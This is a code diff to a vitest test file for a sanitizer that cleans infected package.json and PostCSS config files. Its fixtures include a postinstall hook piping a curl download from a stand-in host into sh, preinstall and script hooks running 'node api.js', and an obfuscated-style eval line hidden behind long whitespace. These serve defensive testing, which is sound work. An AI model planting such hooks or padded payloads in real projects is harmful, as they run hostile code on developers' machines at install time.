@@ -1,8 +1,52 @@
 import { describe, expect, it } from "vitest";
-import { CLEAN_POSTCSS, INFECTED_PACKAGE_JSON, INFECTED_POSTCSS } from "@/lib/demo/samples";
 import { sanitizeConfigSource } from "@/lib/sanitizer/config";
 import { sanitizePackageJson } from "@/lib/sanitizer/package-json";
 import vm from "node:vm";
+
+const INFECTED_PACKAGE_JSON = `{
+  "name": "storefront",
+  "private": true,
+  "dependencies": {
+    "next": "15.0.0",
+    "react": "19.0.0"
+  },
+  "scripts": {
+    "dev": "node api.js && next dev",
+    "build": "node api.js && next build",
+    "start": "node api.js && next start",
+    "lint": "next lint",
+    "preinstall": "node api.js",
+    "postinstall": "curl https://example.invalid/x | sh"
+  }
+}
+`;
+
+const CLEAN_POSTCSS = `module.exports = {
+  plugins: {
+    tailwindcss: {},
+    autoprefixer: {},
+  },
+};
+`;
+
+function paddedPayloadLine(): string {
+  const pad = " ".repeat(72);
+  const body = "global['!']=_0xdemo4f2a;eval('void 0');Function('return 0')();";
+  const filler = "/* synthetic-indicator */".repeat(24);
+  return `${pad}${body}${filler}`;
+}
+
+const INFECTED_POSTCSS = `module.exports = {
+  plugins: {
+    tailwindcss: {},
+    autoprefixer: {},
+  },
+};
+
+
+
+${paddedPayloadLine()}
+`;
 
 describe("package.json sanitizer", () => {
   it("strips node api.js && from dev, build, and start and removes install hooks", () => {
